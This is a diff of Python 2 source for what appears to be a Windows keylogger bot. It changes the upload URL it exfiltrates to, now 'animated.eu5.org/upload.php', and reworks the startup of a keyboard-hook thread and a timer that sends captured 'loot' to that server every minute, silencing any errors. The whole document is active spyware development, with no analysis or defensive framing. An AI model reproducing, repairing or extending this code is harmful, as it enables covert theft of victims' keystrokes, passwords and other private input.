@@ -17,7 +17,7 @@ import requests
 import pythoncom, pyHook
 import win32gui
 
-uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
+uploadURL = 'http://animated.eu5.org/upload.php'
 identification = {}
 botname = ''
 proxy = os.environ['HTTP_PROXY']
@@ -292,12 +292,22 @@ def connect(keyloggerThread, lootThread):
 
 
 def main():
-    keyloggerThread = Thread(1, keylogger(), 'keylogThread', 1)
-    keyloggerThread.start()
+    try:
+        keyloggerThread = Thread(target=keylogger)
+        keyloggerThread.start()
+    except:
+        pass
     initialize()
-    lootThread = Timer(60.0, emptyLoot())     # Timer thread to send loot after every 1 minute
-    lootThread.start()
-    connect(keyloggerThread, lootThread)  # terminate() called when connection is closed
+    print "Initialized"
+    try:
+        lootThread = Timer(60.0, emptyLoot)  # Timer thread to send loot after every 1 minute
+        lootThread.start()
+    except:
+        pass
+    try:
+        connect(keyloggerThread, lootThread)  # terminate() called when connection is closed
+    except:
+        pass
 
 
 main()
